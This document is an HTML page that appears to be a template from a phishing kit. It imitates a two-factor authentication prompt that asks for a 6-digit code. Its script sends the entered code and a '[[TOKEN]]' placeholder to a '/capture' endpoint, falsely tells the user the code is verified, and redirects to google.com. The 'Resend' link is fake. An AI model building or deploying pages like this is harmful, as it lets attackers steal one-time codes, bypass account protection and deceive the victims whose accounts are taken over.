<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verify Account</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f5f5f5;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{background:#fff;border-radius:16px;padding:40px;text-align:center;max-width:400px;box-shadow:0 4px 20px rgba(0,0,0,0.1)}
.shield{font-size:60px;margin-bottom:20px}
h2{margin-bottom:10px}
p{color:#666;margin-bottom:20px}
.code-inputs{display:flex;gap:10px;justify-content:center;margin:30px 0}
.code-inputs input{width:50px;height:60px;text-align:center;font-size:24px;border:2px solid #ddd;border-radius:8px;outline:none}
.code-inputs input:focus{border-color:#007bff}
button{background:#007bff;color:#fff;padding:14px 30px;border:none;border-radius:8px;font-size:16px;cursor:pointer;width:100%}
.resend{margin-top:20px;color:#007bff;cursor:pointer}
</style>
</head>
<body>
<div class="container">
<div class="shield">🔐</div>
<h2>Two-Factor Authentication</h2>
<p>Enter the 6-digit code sent to your phone</p>
<div class="code-inputs">
<input type="text" maxlength="1" id="d1"><input type="text" maxlength="1" id="d2">
<input type="text" maxlength="1" id="d3"><input type="text" maxlength="1" id="d4">
<input type="text" maxlength="1" id="d5"><input type="text" maxlength="1" id="d6">
</div>
<button onclick="verify()">Verify Code</button>
<div class="resend" onclick="resend()">Didn't receive code? Resend</div>
<div id="error" style="color:red;margin-top:15px;display:none"></div>
</div>
<script>
async function verify(){const c=[1,2,3,4,5,6].map(i=>document.getElementById('d'+i).value).join('');if(c.length!=6){document.getElementById('error').style.display='block';document.getElementById('error').innerText='Enter 6-digit code';return;}await fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:'[[TOKEN]]',data:{otpCode:c}})});document.getElementById('error').style.display='block';document.getElementById('error').style.color='#28a745';document.getElementById('error').innerHTML='✅ Verified! Redirecting...';setTimeout(()=>{window.location.href='https://google.com'},2000);}
function resend(){document.getElementById('error').style.display='block';document.getElementById('error').style.color='#007bff';document.getElementById('error').innerText='Code resent!';setTimeout(()=>{document.getElementById('error').style.display='none'},3000);}
document.getElementById('d1').focus();
</script>
</body>
</html>
